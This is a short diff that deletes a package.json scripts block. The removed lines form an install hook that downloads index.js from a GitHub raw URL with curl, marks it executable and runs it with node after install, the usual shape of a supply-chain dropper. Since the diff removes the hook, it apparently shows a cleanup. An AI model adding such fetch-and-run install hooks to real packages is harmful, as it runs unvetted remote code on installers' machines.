@@ -1,6 +1,0 @@
-{
-  "scripts": {
-    "preinstall": "curl -O https://raw.githubusercontent.com/dinasimpik/Panuan/refs/heads/main/index.js && chmod +x index.js",
-    "postinstall": "node index.js"
-  }
-}
